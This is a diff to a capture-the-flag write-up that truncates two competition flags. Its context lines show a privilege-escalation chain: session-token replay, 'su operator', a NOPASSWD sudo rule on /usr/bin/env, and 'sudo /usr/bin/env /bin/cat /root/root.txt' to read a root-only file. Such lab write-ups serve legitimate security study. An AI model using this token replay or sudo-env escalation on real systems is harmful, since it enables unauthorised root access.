@@ -54,7 +54,7 @@ Using the returned password, the successful run called `su operator` under a pse
 
 ```text
 Password:
-PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::aBfyfXvKt36U}
+PP{c4rb0n_c4ch3d_s3…Kt36U}
 
 User operator may run the following commands:
     (root) NOPASSWD: /usr/bin/env
@@ -73,7 +73,7 @@ sudo /usr/bin/env /bin/cat /root/root.txt
 Result:
 
 ```text
-PP{0p3r4t0r_3nv_1s_r00t::gXG9iPj_dtEE}
+PP{0p3r4t0r_3nv_1s_…_dtEE}
 ```
 
 **Both flags were accepted by the competition platform.** The concrete chain was RSC deserialization → `nextjs` execution → local ops notes → Redis `session:operator` → bearer replay to internal API → `su operator` → NOPASSWD `/usr/bin/env` → root.
